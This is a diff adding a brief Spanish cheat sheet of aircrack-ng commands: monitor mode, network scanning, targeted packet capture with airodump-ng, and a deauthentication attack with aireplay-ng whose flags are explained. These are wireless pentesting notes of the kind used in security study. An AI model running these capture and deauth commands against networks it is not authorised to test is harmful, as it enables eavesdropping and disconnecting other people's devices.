@@ -1,0 +1,32 @@
+· Detener cualquier proceso que use WLAN0:
+$sudo airmon-ng check kill
+
+· Interfaz modo monitor:
+$sudo airmon-ng start wlan0
+
+· Detener interfaz modo monitor:
+$sudo airmon-ng stop <nombre_de_la_interfaz_monitoreada>
+
+· Verificar estado Monitor:
+$iwconfig
+
+· Listar redes wifi:
+$sudo airodump-ng wlan0mon
+
+· Monitorizar trafico de una red en concreto:
+$sudo airodump-ng --bssid BSSID --channel channel -w capturefile wlan0mon
+
+· Mostrar datos capturados:
+$sudo airodump-ng -r capturefile-01.cap
+
+· Enviar paquete deauth:
+$sudo aireplay-ng -0 1 -a BSSID -c STATION_MAC wlan0mon
+
+-0: Indica que estás enviando un paquete de deautenticación.
+1: Especifica el número de paquetes de deautenticación a enviar. Puedes cambiar este número si deseas enviar más paquetes.
+-a BSSID: Especifica la dirección MAC del enrutador.
+-c STATION_MAC: Especifica la dirección MAC de la estación que deseas deautenticar.
+wlan0mon: Es el nombre de tu interfaz inalámbrica en modo monitor. Asegúrate de reemplazarlo si tu interfaz tiene un nombre diferente.
+
+
+
